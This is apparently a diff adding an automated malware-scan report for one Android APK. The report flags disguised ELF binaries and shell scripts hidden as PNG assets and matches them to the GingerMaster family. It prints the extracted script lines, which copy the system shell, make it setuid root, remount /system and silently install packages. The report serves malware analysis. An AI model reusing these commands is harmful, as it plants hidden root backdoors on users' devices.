@@ -1,0 +1,83 @@
+[Info]
+------
+File path:	/media/dati/Lavoro/Tesi/Tools/a-legit/single/2e9b8a7a149fcb6bd2367ac36e98a904d4c5e482.apk
+MD5:		b0cf27edcb71b055ad20d3e055ef85ca
+SHA1:		2e9b8a7a149fcb6bd2367ac36e98a904d4c5e482
+SHA256:		c9d705056dc94035eed7e9f2148bf90f9bc03b6ab37c49682f1f0ca3e141f4f7
+Duration:	1.092 s
+
+[Risk score]
+------
+Total risk score:	100
+InfectedDex risk:	0
+InfectedElf risk:	200
+HiddenApk:			0
+HiddenElf:			2
+HiddenText:			2
+EmbeddedApk risk:	0
+Shell risk:			1
+ShellInstall:		2
+ShellPrivilege:		8
+ShellOther:			4
+
+[Files types]
+------
+dex:	1
+android xml:	26
+unknown binary:	1
+android resource:	1
+text:	4
+multimedia:	26
+elf:	2
+
+[Embedded apk]
+------
+
+[Infected files]
+------
+From http://www.team-cymru.org/Services/MHR:
+classes.dex:	0% detection rate
+assets/runme.png:	0% detection rate
+assets/gbfm.png:	18% detection rate
+From known exploits:
+assets/runme.png:	gingermaster-runme.png
+assets/gbfm.png:	gingermaster-gbfm.png
+
+[Suspicious extensions]
+------
+assets/runme.png:	ELF 32-bit LSB executable, ARM, version 1 (SYSV)
+assets/installsoft.png:	a /data/data/com.igamepower.appma script text executable
+assets/gbfm.png:	ELF 32-bit LSB executable, ARM, version 1 (SYSV)
+assets/install.png:	a /data/data/com.igamepower.appma script text executable
+
+[Shell commands]
+------
+assets/install.png:	#!/data/data/com.igamepower.appmaster/files/sh
+assets/install.png:	chown 0.0 /data/data/com.igamepower.appmaster/files/sh.new
+assets/install.png:	chmod 4755 /data/data/com.igamepower.appmaster/files/sh.new
+assets/install.png:	chown ${myuid} /system/xbin/appmaster
+assets/install.png:	chmod 700 /system/xbin/appmaster
+assets/install.png:	chown 0.0 /system/xbin/appmaster/sh
+assets/install.png:	chmod 4755 /system/xbin/appmaster/sh
+assets/install.png:	mount -o remount system /system
+assets/install.png:	mount -o remount,ro system /system
+assets/install.png:	cat /system/bin/sh > /data/data/com.igamepower.appmaster/files/sh.new
+assets/install.png:	cat /system/bin/sh > /system/xbin/appmaster/sh
+assets/install.png:	#/system/bin/stop vold
+assets/install.png:	#/system/bin/start vold
+assets/installsoft.png:	#!/data/data/com.igamepower.appmaster/files/sh
+assets/installsoft.png:	result=`/system/bin/pm install -r $1`
+assets/installsoft.png:			/data/data/com.igamepower.appmaster/files/runme.sh /system/bin/am start -n com.igamepower.appmaster/com.igamepower.appmaster.Myhall &
+assets/installsoft.png:	result=`/system/bin/pm install -r $1`
+assets/installsoft.png:			/data/data/com.igamepower.appmaster/files/runme.sh /system/bin/am start -n com.igamepower.appmaster/com.igamepower.appmaster.Myhall &
+
+[Urls]
+------
+
+[Possible phone numbers]
+------
+assets/install.png:	4755
+assets/install.png:	4755
+META-INF/MANIFEST.MF:	4096
+META-INF/MANIFEST.MF:	4096
+META-INF/CERT.SF:	84220
